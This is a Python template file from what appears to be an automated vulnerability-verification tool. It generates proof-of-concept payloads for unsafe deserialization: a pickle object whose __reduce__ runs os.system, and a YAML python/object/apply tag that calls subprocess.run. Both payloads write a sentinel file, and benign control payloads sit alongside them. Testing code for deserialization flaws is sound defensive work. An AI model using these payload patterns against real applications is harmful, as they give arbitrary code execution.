#!/usr/bin/env python3
from __future__ import annotations
"""Unsafe-deserialization PoC for pickle.loads / yaml.load sinks."""

import os
from deepaudit.core.repo_map import RepoModel
from deepaudit.core.source_adapters import SourceAdapter
from deepaudit.models.candidate import VulnerabilityCandidate
from deepaudit.templates.base import BaseTemplate


class UnsafeDeserializationPickleTemplate(BaseTemplate):
    name = "unsafe_deserialization_pickle"
    exploit_class = "unsafe_deserialization"
    def sentinel_channels(self) -> list[str]:
        return ["file"]

    def environmental_preconditions(self, candidate, env) -> bool:
        return env.writable_tmp

    def _sentinel_file(self, candidate_id: str) -> str:
        return f"/tmp/sentinel-{candidate_id[:8]}"

    def resolved_channels(self, candidate: VulnerabilityCandidate) -> list[str]:
        return [f"file:{self._sentinel_file(candidate.id)}"]

    def _is_yaml(self, candidate: VulnerabilityCandidate) -> bool:
        return "yaml.load" in candidate.sink.expression or "yaml.unsafe_load" in candidate.sink.expression

    def _exploit_payload(self, candidate: VulnerabilityCandidate, sentinel: str, sentinel_file: str) -> str:
        if self._is_yaml(candidate):
            return f"!!python/object/apply:subprocess.run [[\"echo\", \"{sentinel}\", \">\", \"{sentinel_file}\"]]"
        # Pickle: os.system writes the sentinel file when unpickled.
        return f"import pickle, os\nclass _Exploit:\n    def __reduce__(self):\n        return (os.system, (\"echo {sentinel} > {sentinel_file}\",))\n"

    def _write_exploit(self, candidate: VulnerabilityCandidate, sentinel: str, payload_path: str, sentinel_file: str) -> str:
        if self._is_yaml(candidate):
            return f"""with open({payload_path!r}, "w") as _f:
    _f.write({self._exploit_payload(candidate, sentinel, sentinel_file)!r})
"""
        return f"""import pickle, os
class _Exploit:
    def __reduce__(self):
        return (os.system, ("echo {sentinel} > {sentinel_file}",))

with open({payload_path!r}, "wb") as _f:
    pickle.dump(_Exploit(), _f)
"""

    def _write_control(self, candidate: VulnerabilityCandidate, payload_path: str) -> str:
        if self._is_yaml(candidate):
            return f"""with open({payload_path!r}, "w") as _f:
    _f.write("x: 1")
"""
        return f"""import pickle
with open({payload_path!r}, "wb") as _f:
    pickle.dump({{"x": 1}}, _f)
"""

    def _payload_path(self, candidate_id: str) -> str:
        return f"/tmp/malicious-{candidate_id[:8]}.pkl"

    def generate_exploit(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        sid = candidate.id[:8]
        payload_path = self._payload_path(candidate.id)
        sentinel_file = self._sentinel_file(candidate.id)
        write_code = self._write_exploit(candidate, sentinel, payload_path, sentinel_file)
        setup = adapter.generate_setup(candidate.source, sentinel, True, candidate, payload_path)
        invocation = adapter.generate_invocation(candidate.source, sentinel, True, candidate, payload_path)
        return f"""{setup}
import sys
sys.path.insert(0, "/repo")

{write_code}

import {candidate.source_module}

{invocation}

print("__HARNESS_DONE__")
"""

    def generate_control(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        sid = candidate.id[:8]
        payload_path = self._payload_path(candidate.id)
        write_code = self._write_control(candidate, payload_path)
        setup = adapter.generate_setup(candidate.source, sentinel, False, candidate, payload_path)
        invocation = adapter.generate_invocation(candidate.source, sentinel, False, candidate, payload_path)
        return f"""{setup}
import sys
sys.path.insert(0, "/repo")

{write_code}

import {candidate.source_module}

{invocation}

print("__HARNESS_DONE__")
"""
